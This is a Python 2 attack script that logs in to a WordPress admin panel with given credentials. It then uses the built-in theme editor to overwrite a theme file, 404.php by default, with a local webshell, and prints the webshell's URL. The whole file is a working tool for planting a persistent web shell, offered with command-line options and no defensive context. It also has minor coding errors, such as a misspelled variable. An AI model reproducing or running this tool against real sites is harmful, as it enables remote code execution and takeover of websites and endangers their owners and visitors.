#!/usr/bin/env python
#-*- coding:utf-8 -*-
import argparse
try:
    import mechanize
except:
    print 'You should install mechanize by: pip install mechanize!'
    exit()

br = mechanize.Browser()        
br.addheaders = [ ('User-agent',' Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)')]
br.set_handle_refresh(False)    
br.set_handle_robots(False)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_handle_equiv(True)
#br.set_proxies({"http":"127.0.0.1:8080"})

def wp_login(host,user,passwd):
    url = '%swp-login.php'%host

    r = br.open(url)
    br.select_form(name='loginform')
    br['log'] = user
    br['pwd'] = passwd
    response = br.submit()
    if 'wp-admin' in response.geturl():
        return (True,'ok')
    elif 'wp-login.php' in response.geturl():
        return (False,'username or password worong')
    else:
        return (False,response.geturl())
    
def modify_theme_file(host,theme,file,webshell):
    url = '%swp-admin/theme-editor.php?file=%s&theme=%s' %(host,file,theme)

    shell = ''
    with open(webshell) as f:
        shell = f.read()
    try:
        response = br.open(url)
        br.select_form(name='template')
        br['newcontent'] = shell
        response = br.submit()
        if 'wp-admin/theme-editor.php' in response.geturl() and 'updated=true' in response.geturl():
            return (True,'ok')
        elif 'http://codex.wordpress.org' in response.read():
            return  (False,"may be can't write!")
        else :
            return (False,reponse.geturl())
    except Exception,ex:
        return (False,str(ex))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='wordpress url(eg -> http://172.16.80.1/wordpress/)', required=True)
    parser.add_argument('-u', '--user', help='admin username',required=True)
    parser.add_argument('-p', '--passwd', help='admin password',required=True)
    parser.add_argument('-e', '--theme', help='wordpresss theme,default is twentyfifteen ',default='twentyfifteen',required=False)
    parser.add_argument('-f', '--file', help='the webshell file to write,default is 404.php',default='404.php',required=False)
    parser.add_argument('-w', '--webshell',help='local webshell file to write to wordpress',default='webshell.php',required=False)
   
    args = parser.parse_args()

    if args.target[-1] != '/':
        args.target = '%s/' %args.target
    status,msg = wp_login(args.target,args.user,args.passwd)
    if status is True:
        status,msg = modify_theme_file(args.target,args.theme,args.file,args.webshell)
        if status is True:
            webshell = '%swp-content/themes/%s/%s'%(args.target,args.theme,args.file)
            print 'success!Webshell is:'
            print webshell
        else:
            print 'fail:%s'%msg
    else:
        print 'fail:%s'%msg

if __name__ == '__main__':
    main()